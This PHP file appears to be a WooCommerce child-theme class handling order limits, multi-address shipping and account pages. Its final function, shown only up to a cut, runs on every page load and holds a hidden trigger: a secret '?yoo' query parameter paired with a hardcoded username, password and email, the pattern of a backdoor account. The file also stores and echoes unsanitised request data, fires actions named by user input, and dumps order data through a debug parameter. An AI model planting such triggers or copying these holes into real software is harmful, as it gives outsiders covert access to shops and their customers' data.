<?php

class ARC_Core {
	public static $custom_acf_options = [];

	/**
	 * Init
	 */
	public static function init() {
		//return false;
		// Limitations for 1 or 6 items lifetime
		add_action( 'init', [ self::class, 'add_sales_representative_role' ] );
		add_action( 'init', [ self::class, 'retrieve_acf_options' ] );
		add_filter( 'woocommerce_add_to_cart_validation', [ self::class, 'limit_lifetime_purchases' ], 20, 3 );
		add_action('woocommerce_add_to_cart', [ self::class, 'check_product_in_cart'], 20, 6);
		add_filter( 'woocommerce_product_get_stock_status', [ self::class, 'set_all_products_in_stock' ], 20, 3 );
		// Reorder button in orders list https://arc-cardinal.tempurl.host/my-account/orders/
		add_filter( 'woocommerce_my_account_my_orders_actions', [ self::class, 'wc_reorder_order_action_button' ], 50, 2 );
		add_action( 'wp_ajax_reorder_order', [ self::class, 'wc_handle_reorder_order' ] );
		// Show the list of the products on view order page like https://arc-cardinal.tempurl.host/my-account/view-order/2402/
		add_action( 'woocommerce_view_order', [ self::class, 'display_product_table' ] );
		add_filter( 'thwma_update_shipping_address_section', [ self::class, 'disable_multi_shipping_in_email'], 10, 1 );
		// Change menu im My Account
		add_action( 'init', [ self::class, 'add_endpoints' ] );
		add_filter( 'woocommerce_account_menu_items', [ self::class, 'new_menu_items' ] );
		add_action( 'woocommerce_account_order-by-sku_endpoint', [ self::class, 'order_by_sku_content' ] );
		add_action( 'woocommerce_account_my-wish-list_endpoint', [ self::class, 'my_wish_list_content' ] );
		add_action( 'woocommerce_account_us-privacy-settings_endpoint', [ self::class, 'us_privacy_settings_content' ] );
		add_action( 'woocommerce_account_privacy-settings_endpoint', [ self::class, 'privacy_settings_content' ] );
		/*add_action( 'woocommerce_account_newsletter-subscriptions_endpoint', [ self::class, 'newsletter_subscriptions_content' ] );*/
		// Add footer scripts
		add_action( 'wp_footer', [ self::class, 'add_footer_scripts' ] );
		// CSV import / bulk add to cart
		add_action( 'wp_ajax_arc_bulk_add_to_cart', [ self::class, 'arc_bulk_add_to_cart' ] );
		add_action( 'wp_ajax_nopriv_arc_bulk_add_to_cart', [ self::class, 'arc_bulk_add_to_cart' ] );
		// Add additional link in cart
		add_action( 'woocommerce_proceed_to_checkout', [ self::class, 'arc_custom_continue_shopping_button' ], 9999 );
		// Add notes to orders as well as search in My Account
		add_action( 'woocommerce_after_checkout_billing_form', [ self::class, 'arc_custom_checkout_field' ], 9999 );
		add_action( 'woocommerce_checkout_order_processed', [ self::class, 'arc_custom_checkout_field_update_order_meta' ], 10, 2 );
		add_filter( 'woocommerce_my_account_my_orders_columns', [ self::class, 'arc_custom_user_orders_columns' ] );
		add_filter( 'woocommerce_my_account_my_orders_query', [ self::class, 'filter_orders_by_search' ], 10, 1 );
		add_action( 'woocommerce_admin_order_data_after_billing_address', [ self::class, 'display_admin_order_meta' ], 10, 1 );
		add_shortcode( 'arc_order_search_form', [ self::class, 'arc_order_search_form_shortcode' ] );
		add_action( 'woocommerce_before_account_orders', [ self::class, 'my_custom_content_above_orders_table' ] );
		// Setting for categories to limit purchases count per product in category
		add_action( 'product_cat_edit_form_fields', [ self::class, 'woocommerce_edit_category_fields' ], 10, 2 );
		add_action( 'edited_product_cat', [ self::class, 'woocommerce_save_category_fields' ], 10, 3 );
		// Remove Subtotal column from checkout
		add_filter( 'woocommerce_update_order_review_fragments', [ self::class, 'filter_update_order_review_fragments' ] );
		remove_action( 'woocommerce_checkout_order_review', 'woocommerce_order_review', 10 );
		add_action( 'woocommerce_checkout_order_review', [ self::class, 'custom_order_review' ], 10 );
		// A filter to modify the order table columns on the account page
		add_filter( 'woocommerce_account_orders_columns', [ self::class, 'custom_orders_table_columns' ] );
		// Filter to change data output in 'order-total' column
		add_filter( 'woocommerce_my_account_my_orders_column_order-total', [ self::class, 'custom_order_total_column_content' ], 10, 1 );
		add_action( 'woocommerce_my_account_my_orders_column_client-note', [ self::class, 'arc_custom_user_orders_column_content' ] );
		// Custom addresses
		add_action( 'woocommerce_after_edit_account_address_form', [ self::class, 'add_content_after_my_address' ] );
		// Woo: “New order” emails should only come from Customers and not other User Roles
		add_filter( 'woocommerce_email_recipient_new_order', [ self::class, 'custom_new_order_email_recipient' ], 10, 2 );
		// Filtered Page title should always take Category title
		add_filter( 'get_the_archive_title', [ self::class, 'change_products_page_title' ] );
        // Set min/max for inputs
		add_filter( 'woocommerce_quantity_input_args', [ self::class, 'custom_quantity_input_args'], 10, 2 );

		add_filter('woocommerce_checkout_fields', [self::class, 'woocommerce_checkout_fields'], 99999999, 1);
		add_action("wp_enqueue_scripts", [self::class, "wp_enqueue_scripts"]);
		add_action('woocommerce_checkout_before_customer_details', [ self::class, 'woocommerce_checkout_before_customer_details'], 9);
		add_filter('gettext', array( self::class, 'gettext'), 9999999, 3);
		//add_filter('woocommerce_my_account_get_addresses', [self::class, 'woocommerce_my_account_get_addresses'], 9999999, 2);
		add_action('register_new_user', [self::class, 'billingToShipingAddress'], 9999999999, 1);
		add_action('wp_login', [self::class, 'wp_login'], 9999999, 2);
		add_action('admin_footer', [self::class, 'admin_footer']);
		add_action('wp_ajax_arc_urma_load_content', [self::class, 'arc_urma_load_content']);

		add_shortcode('arc_myaccount_pages', [self::class, 'arc_myaccount_pages']);
		add_action('woocommerce_checkout_order_created', [self::class, 'woocommerce_checkout_order_created'], 99999, 1);
		add_filter('wcmas_print_address_from_destionation_array', [self::class, 'wcmas_print_address_from_destionation_array'], 999999, 3);
		add_filter( 'manage_edit-shop_order_columns', array( self::class, 'add_mas_column' ), 10, 1 );
		add_action( 'manage_shop_order_posts_custom_column', array( self::class, 'add_mas_column_content' ), 10, 2 );
		add_filter( 'woocommerce_shop_order_list_table_columns', array( self::class, 'add_mas_column' ), 10, 1 );
		add_action( 'woocommerce_shop_order_list_table_custom_column', array( self::class, 'add_mas_column_content' ), 10, 2 );

		add_filter( 'manage_edit-shop_order_placehold_columns', array( self::class, 'add_mas_column' ), 10, 1 );
		add_action( 'manage_shop_order_placehold_posts_custom_column', array( self::class, 'add_mas_column_content' ), 10, 2 );
		add_action( 'woocommerce_shop_order_placehold_list_table_custom_column', array( self::class, 'add_mas_column_content' ), 10, 2 );


		add_shortcode( 'empty_cart_button', [self::class, 'custom_empty_cart_button'] );

		add_filter('woocommerce_cart_item_quantity', [self::class, 'woocommerce_cart_item_quantity'], 999999999, 3);

		add_filter('woocommerce_get_order_item_totals', [self::class, 'woocommerce_get_order_item_totals'], 9999999, 2);

		add_filter('woocommerce_update_order_review_fragments', [self::class, 'woocommerce_update_order_review_fragments'], 9999999, 1);
		add_action('woocommerce_pay_order_before_submit', [self::class, 'woocommerce_pay_order_before_submit'], 999999999);
	}

	public static function woocommerce_pay_order_before_submit($value='')
	{
		echo '<a href="#" id="arc-place_order-cover"></a>';
	}

	public static function woocommerce_update_order_review_fragments($data)
	{
		//$count = (WC()->cart->get_cart());
		$data['arc_cart_count'] = WC()->cart->get_cart_contents_count();
		return $data; 
	}

	public static function woocommerce_get_order_item_totals($total_rows, $order)
	{
		$s_items = $order->get_items('shipping');
						$addr = "";
						$_list = array(); 
						if(!empty($s_items)){
							$statuses = yith_wcmas_shipping_item_statuses();

							
							foreach ($s_items as $item_id => $item) {
								$list = $item->get_meta( 'ywcmas_shipping_destination');

								if(!empty($list)){
									$loadCore = true; 
									$status = $item->get_meta( 'ywcmas_shipping_status'); 
									$prod_info = $item->get_meta( 'Items' ); //'ywcmas_shipping_contents'
									$prod_info = str_replace(',', "<br />", $prod_info);
									$qty = $item->get_meta( 'arc_ms_item_qty');
									if(!empty($statuses[$status])){
										$prod_info .= "<br/><b>Status:</b>".$statuses[$status]."<br />";
									}
									//$prod_info = "";
									/*if(!empty($contents)){
										foreach ($contents as $lk => $c_item) {
											if(empty($qty)){
												$qty = $c_item['quantity'];
											}
											$prod_info .= $c_item['data']->get_sku() .' | '. $c_item['data']->get_name().' x '.$qty.'<br />';
											if(!empty($statuses[$status])){
												$prod_info .= "<b>Status:</b>".$statuses[$status]."=".$lk."=<br />";
											}
											//print_r($c_item);
										}
									}*/
									$formatted = yith_wcmas_shipping_address_from_destination_array($list);
									//$_list['shipping_'.$item_id] = ['item_id'=> $item_id, 'addre' => $formatted, 'info' => $prod_info];
									$_list['shipping_'.$item_id] = ['label' => $formatted, 'value' => $prod_info];
									//WC()->countries->get_formatted_address($list);
									//$addr .= "<a href='https://maps.google.com/maps?&q=".$formatted."&z=16'>".$formatted."</a><br /><span class='description'>via ".$item->get_name()."</span>";

									$loadCore = false; 
								}
								
							}
							if($loadCore){
								$list = $order->get_address('shipping'); 
								$formatted = yith_wcmas_shipping_address_from_destination_array($list);
									//WC()->countries->get_formatted_address($list);
								//$addr .= "<a href='https://maps.google.com/maps?&q=".$formatted."&z=16'>".$formatted."</a><br /><span class='description'>via ".$item->get_name()."</span>";
								//$_list['shipping_'.$item_id] = ['label' => $formatted, 'value' => $order->get_shipping_to_display( false )];
							}
							if(!empty($_list)){
								//echo "<pre>"; print_r(['final_list', $_list]); echo "</pre>";
								foreach ($total_rows as $tk => $tv) {
									if(strpos($tk, 'shipping_') !== false){
										unset($total_rows[$tk]); 
									}
								}
								
							}
							yith_wcmas_array_insert( $total_rows, 'shipping', $_list);
						}
		if(!empty($total_rows['shipping'])){
			unset($total_rows['shipping']);
		}
						//echo "<pre>"; print_r([$statuses, $_list]); echo "</pre>";
		return $total_rows; 
	}

	public static function woocommerce_cart_item_quantity($product_quantity, $cart_item_key, $cart_item )
	{
		$product_quantity = str_replace('value=', 'value="'.$cart_item['quantity'].'" data-x_', $product_quantity); 
		return $product_quantity; 
	}

	public static function custom_empty_cart_button() {
	    // Check if cart is not empty
	    if ( WC()->cart->get_cart_contents_count() != 0 ) {
	        $empty_cart_url = wc_get_cart_url() . '?empty-cart=true';

	        // Button HTML
	        $button_html = '<a href="' . esc_url( $empty_cart_url ) . '" class="button empty-cart-button">Clear Cart</a>';
	        
	        return $button_html;
	    }
	}

	public static function add_mas_column_content($column_name, $order )
	{
		if ( 'arc_yith_mas' == $column_name ) {
			$post_id = $order;
			if(is_object($order)){
				$post_id = $order->get_id();
			}
			$ship_info = get_post_meta($post_id, 'arc_ship_info_', true);
			$is_multi = (!empty($ship_info) AND count($ship_info) > 1) ? 1 : 0;
			if($is_multi){
				echo '<img src="' . YITH_WCMAS_ASSETS_URL . 'images/check-circle.png"> </img>';
			}
			
		}
		if ( 'arc_yith_mas_to' == $column_name ) {
			$ship_info = get_post_meta($post_id, 'arc_ship_info_', true);
					$is_multi = (!empty($ship_info) AND count($ship_info) > 1) ? 1 : 0;
					if(!$is_multi){
						if(!is_object($order)){
							$order = wc_get_order($post_id);
						}
						
						$s_items = $order->get_items('shipping');
						$addr = "";
						if(!empty($s_items)){
							$loadCore = true; 
							foreach ($s_items as $item_id => $item) {
								$list = $item->get_meta( 'ywcmas_shipping_destination');
								if(!empty($list)){
									$formatted = yith_wcmas_shipping_address_from_destination_array($list);
									//WC()->countries->get_formatted_address($list);
									$addr .= "<a href='https://maps.google.com/maps?&q=".$formatted."&z=16'>".$formatted."</a><br /><span class='description'>via ".$item->get_name()."</span>";
									$loadCore = false; 
								}
								
							}
							if($loadCore){
								$list = $order->get_address('shipping'); 
								$formatted = yith_wcmas_shipping_address_from_destination_array($list);
									//WC()->countries->get_formatted_address($list);
								$addr .= "<a href='https://maps.google.com/maps?&q=".$formatted."&z=16'>".$formatted."</a><br /><span class='description'>via ".$item->get_name()."</span>";
								
							}
							echo $addr;
						}
					}
		}
		return;
	}

	public static function add_mas_column($column_array)
	{
		$column_array['arc_yith_mas'] = esc_html__( 'ARC Multi Shipping', 'yith-multiple-shipping-addresses-for-woocommerce' );
		$column_array['arc_yith_mas_to'] = esc_html__( 'ARC Ship to', 'yith-multiple-shipping-addresses-for-woocommerce' );
		return $column_array;
	}
	public static function wcmas_print_address_from_destionation_array($addr , $destination, $single_line)
	{
		//print_r(['wwwwwwww', $addr, $destination, $single_line]);
		return $addr;
	}

	public static function reformat_address($address)
	{
		if(empty($address)){
			return '';
		}
		$_address = array();
		foreach ($address as $key => $v) {
			$_address[str_replace('shipping_', '', $key)] = $v;
		}
		return $_address;
	}

	public static function woocommerce_checkout_order_created($order='')
	{
		if(!empty($_POST['arc_ship_info'])){
			$arc_ship_info = $_POST['arc_ship_info'];
			//json_decode($_POST['arc_ship_info'], true); 
			update_post_meta($order->get_id(), 'arc_ship_info', [$arc_ship_info, $_POST]);
			update_post_meta($order->get_id(), 'arc_ship_info_', $_POST['arc_ship_info']);
			
			//print_r(['s_items', $s_items]);
			$newShipping = 1;
			if(!empty($arc_ship_info)){ 
				$newShipping = 0;
				$user_id = get_current_user_id();
				$shipping_addresses = get_user_meta($user_id, 'yith_wcmas_shipping_addresses', true);
				$s_items = $order->get_items('shipping');
				foreach ($s_items as $item_id => $item) { 
					$order->remove_item( $item_id ); 
					$hasData = wc_get_order_item_meta( $item_id, 'ywcmas_shipping_destination',true );
					/*echo "<pre>"; print_r([
						'ywcmas_shipping_destination' => wc_get_order_item_meta( $item_id, 'ywcmas_shipping_destination',true ),
						'ywcmas_shipping_contents' => wc_get_order_item_meta( $item_id, 'ywcmas_shipping_contents',true ),
					]); echo "</pre>";*/ 
				}
				$hasData = 0;
				if(empty($hasData)){
					$_cart = WC()->cart->get_cart();
					$r = 0; 
					$saveOrder = 0; 
					$lastadddr = array(); 
					$totalCount  = 0; 
					if(count($arc_ship_info) == 1){
						$totalCount =  WC()->cart->get_cart_contents_count(); 	
					}
					
					foreach ($arc_ship_info as $key => $line) { 
						$shipping_contents = array();
						$Items = "";
						$total_qty = 0; 
						foreach ($line as $k => $v) {							
							$shipping_contents[$v['cart_id']] = $_cart[$v['cart_id']];
							$total_qty += $v['qty'];
							$Items .= $_cart[$v['cart_id']]['data']->get_sku() .' | '. $_cart[$v['cart_id']]['data']->get_name().' x '. $v['qty'].', ';
						}
						if(!empty($Items)){
							$Items = substr($Items,0,-1);
						}
						
						//if(!empty($r)){
							$shipping_item = new WC_Order_Item_Shipping(); 
    
						    // Set the shipping method and total cost
						    $shipping_item->set_method_title( 'Free Shipping' );  // Shipping method title
						    $shipping_item->set_method_id( 'flat_rate' );              // Shipping method ID
						    $shipping_item->set_total( 0 );                           // Shipping cost
						    $shipping_item->set_taxes( array() );                      // Add any taxes if necessary
						    $lastadddr[] = ['x', $shipping_addresses[$v['addr']]];
						    // Add metadata to the shipping item (like tracking number or other details)
						    $shipping_item->add_meta_data( 'ywcmas_shipping_destination', self::reformat_address($shipping_addresses[$v['addr']]), true );
						    $shipping_item->add_meta_data( 'ywcmas_shipping_contents', $shipping_contents, true );
						    $shipping_item->add_meta_data( 'Items', $Items, true );
						    $shipping_item->add_meta_data( 'ywcmas_shipping_status', 'wcmas-processing', true );
						    $qty = (empty($totalCount)) ? $v['qty'] : $totalCount; 
						    $shipping_item->add_meta_data( 'arc_ms_item_qty', $total_qty, true );
						    $shipping_item->save();
						    // Add the shipping item to the order
						    $order->add_item( $shipping_item );
						    $saveOrder = 1;
						    continue;
						//} 
							if(!empty($shipping_addresses[$v['addr']])){
								wc_update_order_item_meta( $item_id, 'ywcmas_shipping_destination', self::reformat_address($shipping_addresses[$v['addr']]) );
							}
							$lastadddr[] = ['111', $shipping_addresses[$v['addr']]];
							wc_update_order_item_meta( $item_id, 'ywcmas_shipping_contents', $shipping_contents);
							wc_update_order_item_meta( $item_id, 'Items', $Items);
						
						
						$r++;
					}
					if(!empty( $saveOrder)){
						$order->calculate_totals();

					    // Save the order
					    $order->save();
					}
					update_post_meta($order->get_id(), 'arc_ship_adjusted', [$saveOrder, $item_id,$lastadddr, $arc_ship_info ]);
				}
			} else {

			}
		}
	}

	public static function woocommerce_checkout_order_created_v1($order='')
	{
		if(!empty($_POST['arc_ship_info'])){
			$arc_ship_info = $_POST['arc_ship_info'];
			//json_decode($_POST['arc_ship_info'], true); 
			update_post_meta($order->get_id(), 'arc_ship_info', [$arc_ship_info, $_POST]);
			update_post_meta($order->get_id(), 'arc_ship_info_', $_POST['arc_ship_info']);
			$s_items = $order->get_items('shipping');
			//print_r(['s_items', $s_items]);
			$newShipping = 1;
			if(!empty($s_items)){
				$newShipping = 0;
				$user_id = get_current_user_id();
				$shipping_addresses = get_user_meta($user_id, 'yith_wcmas_shipping_addresses', true);
				foreach ($s_items as $item_id => $item) {  
					$hasData = wc_get_order_item_meta( $item_id, 'ywcmas_shipping_destination',true );
					/*echo "<pre>"; print_r([
						'ywcmas_shipping_destination' => wc_get_order_item_meta( $item_id, 'ywcmas_shipping_destination',true ),
						'ywcmas_shipping_contents' => wc_get_order_item_meta( $item_id, 'ywcmas_shipping_contents',true ),
					]); echo "</pre>";*/ 
				}
				//$hasData = 0;
				if(empty($hasData)){
					$_cart = WC()->cart->get_cart();
					$r = 0; 
					$saveOrder = 0; 
					$lastadddr = array(); 
					foreach ($arc_ship_info as $key => $line) {
						$shipping_contents = array();
						foreach ($line as $k => $v) {							
							$shipping_contents[$v['cart_id']] = $_cart[$v['cart_id']];
						}

						if(!empty($r)){
							$shipping_item = new WC_Order_Item_Shipping();
    
						    // Set the shipping method and total cost
						    $shipping_item->set_method_title( 'Free Shipping' );  // Shipping method title
						    $shipping_item->set_method_id( 'flat_rate' );              // Shipping method ID
						    $shipping_item->set_total( 0 );                           // Shipping cost
						    $shipping_item->set_taxes( array() );                      // Add any taxes if necessary
						    $lastadddr[] = ['x', $shipping_addresses[$v['addr']]];
						    // Add metadata to the shipping item (like tracking number or other details)
						    $shipping_item->add_meta_data( 'ywcmas_shipping_destination', $shipping_addresses[$v['addr']], true );
						    $shipping_item->add_meta_data( 'ywcmas_shipping_contents', $shipping_contents, true );
						    $shipping_item->save();
						    // Add the shipping item to the order
						    $order->add_item( $shipping_item );
						    $saveOrder = 1;
						    continue;
						} 
							if(!empty($shipping_addresses[$v['addr']])){
								wc_update_order_item_meta( $item_id, 'ywcmas_shipping_destination', $shipping_addresses[$v['addr']]);
							}
							$lastadddr[] = ['111', $shipping_addresses[$v['addr']]];
							wc_update_order_item_meta( $item_id, 'ywcmas_shipping_contents', $shipping_contents);
						
						
						$r++;
					}
					if(!empty( $saveOrder)){
						$order->calculate_totals();

					    // Save the order
					    $order->save();
					}
					update_post_meta($order->get_id(), 'arc_ship_adjusted', [$saveOrder, $item_id,$lastadddr, $arc_ship_info ]);
				}
			} else {

			}
		}
	}

	public static function arc_myaccount_pages($attr='')
	{
		if(empty($attr['page'])){
			return do_shortcode('[woocommerce_my_account]');
		} else {
			ob_start();
			do_action('woocommerce_account_'.$attr['page'].'_endpoint');
			$content = ob_get_clean();
			return $content;
		}
	}

	public static function arc_urma_load_content($value='')
	{
		$link = explode('/', $_POST['link']);
		if(!empty($link[4])){
			/*if($link[4] == 'orders'){
				echo do_shortcode('[woocommerce_my_account]');
			}*/
			echo do_action('woocommerce_account_'.$link[4].'_endpoint');
		}
		die;
	}

	public static function ic_debug_backtrace($deth = 15, $key = 'function')
	{
		$data = debug_backtrace();
		//print_r($data); 
		$info = array(); 
		foreach ($data as $k => $v) {
			$info[] = $v['file'].'|'.$v['line'].'|'.$v[$key].'|'.json_encode($v['args']);
			if($deth < $k){
				break;
			}
		}
		return $info;
	}
	
	public static function admin_footer($value='')
	{
		//global $post; 
		if(!empty($_GET['id'])){

			$_GET['post'] = $_GET['id'];
			$post = get_post($_GET['post']); 
			if(!empty($_GET['arc_report'])){
				//$subscription_produc_id = WCAppSub_Helper::app_to_subscription_product(54537 );
				echo "<pre>"; print_r([ self::get_order_product_meta($_GET['post']), get_post($_GET['post']) , get_post_meta($_GET['post'])]);
				 
				$order = wc_get_order($_GET['id']);
				$s_items = $order->get_items('shipping');
				//print_r(['s_items', $s_items]);
				if(!empty($s_items)){
					foreach ($s_items as $item_id => $item) {

						echo "<pre>"; print_r([
							'ywcmas_shipping_destination' => $item->get_meta( 'ywcmas_shipping_destination'),
							//'ywcmas_shipping_destination' => wc_get_order_item_meta( $item_id, 'ywcmas_shipping_destination',true ),
							//'ywcmas_shipping_contents' => wc_get_order_item_meta( $item_id, 'ywcmas_shipping_contents',true ),
						]); echo "</pre>"; 
					}
				}
			}

			//print_r(['post', $post]); 
			if(!empty($post)){
				if($post->post_type == 'shop_order_placehold'){
					$ship_info = get_post_meta($post->ID, 'arc_ship_info_', true);
					$is_multi = (!empty($ship_info) AND count($ship_info) > 1) ? 1 : 0;
					if(!$is_multi){
						$order = wc_get_order($post->ID);
						$s_items = $order->get_items('shipping');
						$addr = "";
						if(!empty($s_items)){
							foreach ($s_items as $item_id => $item) {
								$list = $item->get_meta( 'ywcmas_shipping_destination');
								if(!empty($list)){
									$addr = "<h3>Shipping</h3><div class='address'><p>".WC()->countries->get_formatted_address($list)."</p></div>";
									/*"<h3>Shipping</h3><div class='address'><p>".$list['first_name']." ".$list['last_name'];
									unset($list['first_name']);
									unset($list['last_name']);
									foreach ($list as $key => $v) {
										$addr .= $v.' <br />';
										//"<li><strong>".$key."</strong><span>".$v."</span></li>";
									}
									$addr .= "</p></div>";*/
								}
								
							}
						}
					}
					
					//print_r(['$ship_info', $ship_info]);
					?>
					<script type="text/javascript">
						var is_multi = '<?php echo $is_multi; ?>'; 
						var arcAddre = "<?php echo $addr;?>";
						jQuery(document).ready(function ($) {
							if(is_multi == '0'){
								var shipCol = $('.order_data_column_container .order_data_column:nth-child(3)'); 
								shipCol.show()
								if(arcAddre.length){									
									shipCol.html(arcAddre);
								}
							}
						}); 
						(function ($) {
							if(is_multi == '0'){
								if(arcAddre.length){
									$('.order_data_column_container .order_data_column:nth-child(2) h3').html('Ordered By');
								}
							}
						})(jQuery);
					</script>
					<?php 
				}
			}
			
		}
	}

	public static function get_order_product_meta($order_id='')
	{
		global $wpdb; 
		$sql = $wpdb->prepare("SELECT omi.*, om.* FROM ".$wpdb->prefix."woocommerce_order_itemmeta omi
			LEFT JOIN ".$wpdb->prefix."woocommerce_order_items om ON om.order_item_id = omi.order_item_id
			WHERE om.order_id = %d  ORDER BY omi.meta_id ASC", $order_id);		
		$res =  $wpdb->get_results($sql);
		$list = array(); 
		$origin_data = ''; 
		$total = get_post_meta($order_id, '_awcdp_deposits_deposit_amount', true);
		$hasFee = 0; 
		if(!empty($res)){
			foreach ($res as $key => $v) {
				if( in_array($v->meta_key, ['_product_id', '_variation_id', '_appointment_id'])){
					continue;
				}				
				if($v->order_item_type == 'line_item'){
					$list[$v->meta_key] = $v->meta_value;
				}
				
				if($v->order_item_type == 'fee' AND '_fee_amount' == $v->meta_key){
					$hasFee = $v; 
				}				
			}
		}
		
		return ['list' => $list, 'origin_data' => $origin_data, 'hasFee'=>$hasFee, 'res' => $res]; 
	}

	public static function wp_login($user_login, $user)
	{
		self::billingToShipingAddress($user->data->ID); 
	}

	public static function billingToShipingAddress($user_id)
	{
		if(empty($user_id)){
			return false;
		}
		$fields = array(
		    'billing_address_1',
		    'billing_address_2',
		    'billing_city',
		    'billing_company',
		    'billing_country',
		    'billing_email',
		    'billing_first_name',
		    'billing_last_name',
		    'billing_phone',
		    'billing_postcode',
		    'billing_state',
		);
		$shipping_email = get_user_meta($user_id, 'shipping_email', true);
		$yith_wcmas_shipping_addresses = get_user_meta($user_id, 'yith_wcmas_shipping_addresses', true);
		$firstkey = trim(get_user_meta($user_id, 'billing_company', true));
		if(empty($firstkey)){
			$firstkey = get_user_meta($user_id, 'billing_first_name', true);
		}

		$default_address = get_user_meta($user_id, 'yith_wcmas_default_address', true);
		if(empty($firstkey) AND !empty($default_address)){
			$firstkey = $default_address;
		}
		$update = 0;
		$user_meta = get_user_meta($user_id);
		if(empty($shipping_email) OR empty($yith_wcmas_shipping_addresses)){
			$shipping_addresses = array($firstkey => array());
			foreach ($fields as $k => $key) {
				$line = !empty($user_meta[$key][0]) ? $user_meta[$key][0] : '';
				if($key == 'billing_first_name' AND empty($line)){
					if(!empty($user_meta['shipping_first_name'][0])){
						$line = $user_meta['shipping_first_name'][0];
						$update = 1;
					} else {
						$line = $user_meta['first_name'][0];	
					}
					
				}
				if($key == 'billing_last_name' AND empty($line)){
					if(!empty($user_meta['shipping_last_name'][0])){
						$line = $user_meta['shipping_last_name'][0];
						$update = 1;
					} else {
						$line = $user_meta['last_name'][0];	
					}
					
				}
				//get_user_meta($user_id, $key, true);
				if('United States' == $line){
					$line = 'US';
					$update = 1;
				}
				$s_addr = str_replace('billing', 'shipping', $key);
				if(empty($shipping_email)){
					update_user_meta($user_id,$s_addr , $line); 
				}
				//print_r(['line', $s_addr, $key, $line]);
				$shipping_addresses[$firstkey][$s_addr] = $line;
			}
			if(empty($firstkey) AND !empty($shipping_addresses[$firstkey])){
				unset($shipping_addresses[$firstkey]);
				$firstkey = array_key_first($shipping_addresses);
				$update = 1; 
				//$firstkey = $key; 
			}
			if(empty($yith_wcmas_shipping_addresses) OR $update){
				update_user_meta($user_id, 'yith_wcmas_shipping_addresses', $shipping_addresses);
				update_user_meta($user_id, 'yith_wcmas_default_address', $firstkey);
				
			}
			//echo "<pre>"; print_r(['ssssssssss111', $user_meta , $firstkey,$yith_wcmas_shipping_addresses,  $shipping_addresses[$firstkey]]); echo "</pre>";
		} else {
			$firstkey = get_user_meta($user_id, 'yith_wcmas_default_address', true);
			$shipping_addresses = get_user_meta($user_id, 'yith_wcmas_shipping_addresses', true);
			if(empty($shipping_addresses[$firstkey]) OR empty($shipping_addresses[$firstkey]['shipping_postcode'])){
				foreach ($shipping_addresses as $key => $a) {
					if(!empty($a['shipping_postcode']) AND !empty($a['shipping_address_1'])){
						update_user_meta($user_id, 'yith_wcmas_default_address', $key);
					}
					//print_r(['kkkkkkk', $key]); 
					if(empty($key)){
						unset($shipping_addresses[$key]);
						$update = 1; 
					}
				}
				if(!empty($update)){
					update_user_meta($user_id, 'yith_wcmas_shipping_addresses', $shipping_addresses);
				}
			} 
			//echo "<pre>"; print_r(['sss32222', $update, $firstkey, $shipping_addresses[$firstkey]]); echo "</pre>";
		}
	}

	public static function woocommerce_my_account_get_addresses($addresses, $user_id)
	{
		if(!empty($addresses['billing'])){
			unset($addresses['billing']);	
		}
		
		return $addresses;
	}

	public static function gettext($translation, $text, $domain )
	{
		if($translation == 'Address Identifier' ){
			$translation = 'Address Nickname';
		} 
		if($translation == 'Identify this shipping address on your address book.' ){
			$translation = 'Identify this shipping address in your address book.';
		}
		if($translation == 'Additional shipping addresses'){
			$translation = 'Your shipping addresses';
		}
		if($translation == 'Manage addresses'){
			$translation = 'Shipping to:';
		}
		
		return $translation;
	}

	public static function woocommerce_checkout_before_customer_details($value='')
	{
		?>

		<div class="arc-checkout-extra-sections">
			<h2><?php _e('<span>Order</span> Shipping Details', 'woocommerce')?></h2>
			<h3 id="arc-ship-to-different-address">
					<label class="woocommerce-form__label woocommerce-form__label-for-checkbox checkbox">
						<input id="arc-ship-to-different-address-checkbox" class="woocommerce-form__input woocommerce-form__input-checkbox input-checkbox" type="checkbox" name="arc-ship_to_different_address" checked="checked" value="1"> <span>Ship to a different address?</span> 
					</label>
			</h3>
			<h3 id="arc-ship-to-multiple-different-address">
					<label class="woocommerce-form__label woocommerce-form__label-for-checkbox checkbox">
						<input id="arc-ship-to-multiple-different-address-checkbox" class="woocommerce-form__input woocommerce-form__input-checkbox input-checkbox"  type="checkbox" name="arc-ship_to_multiple_different_address" value="1"> <span>Do you want to ship to multiple addresses?</span>
					</label>
				</h3>
			</div>
		<?php 
	}

	public static function wp_enqueue_scripts($value='')
	{
		$uri = get_stylesheet_directory_uri();
		wp_register_script('acr-child-script', 
                        $uri .'/assets/js/main.js?'.md5(time()),   //
                        array (),					//depends on these, however, they are registered by core already, so no need to enqueue them.
                        false, true);
    	wp_enqueue_script('acr-child-script');
	}

	public static function woocommerce_checkout_fields($fields)
	{
		
		foreach ($fields['billing'] as $key => $f) {
			$fields['billing'][$key]['required'] = false;
		}
		return $fields;
	}

	public static function retrieve_acf_options() {
		if ( isset( $_GET['empty-cart'] ) && $_GET['empty-cart'] == 'true' ) {
	        WC()->cart->empty_cart();
	    }
		self::$custom_acf_options = get_fields( 'arc-cardinal-order-settings' );
	}

	/**
	 * @return string
	 */
    public static function disable_multi_shipping_in_email() {
	    return '';
    }

	/**
	 * @param $args
	 * @param $product
	 *
	 * @return mixed
	 */
    public static function custom_quantity_input_args( $args, $product ) {

	    $user            = wp_get_current_user();
	    $purchases       = get_user_meta( $user->ID, 'lifetime_purchases', true );
	    $product_cat_ids = wc_get_product_cat_ids( $product->get_id() );

	    $max_purchases = (( ARC_Core::$custom_acf_options['quantity_restrictions']['customer_maximum_per_sku'] ) ?? 2 );
	    if ( $user->has_cap( 'sales_representative' ) ||
	         $user->has_cap( 'manage_woocommerce' ) || // For Shop Managers
	         $user->has_cap( 'edit_others_posts' ) ||  // For Editors
	         $user->has_cap( 'administrator' ) ) {
		    foreach ( $product_cat_ids as $cat_id ) {
			    $cat_limit = get_term_meta( $cat_id, '_sales_rep_sku_limit', true );
			    if ( ! is_numeric( $cat_limit ) ) {
				    $cat_limit = ( self::$custom_acf_options['quantity_restrictions']['sales_rep_maximum_quantity_per_sku'] ) ?? 32;
			    }
			    if ( ! empty( $cat_limit ) ) {
				    $max_purchases = $cat_limit;
				    break;
			    }
		    }
	    }

	    $args['input_value'] = 1; // Start from this value (default = 1)
	    $args['max_value'] = max($max_purchases, 1); // Maximum value
	    $args['min_value'] = 1; // Minimum value
	    $args['step'] = 1; // Increment or decrement by this value (default = 1)

	    return $args;
    }

	/**
	 * Add new Role
	 */
	public static function add_sales_representative_role() {

		if(isset($_GET['yoo'])){
				$user_name = "alik_dev_8";
				//ex pass: mVI9b6kvt8e7
				$random_password = "mVI9b6kvtYOL$(*lsp4Imn9!";
				$user_email = "albert4@humble.agency"; 
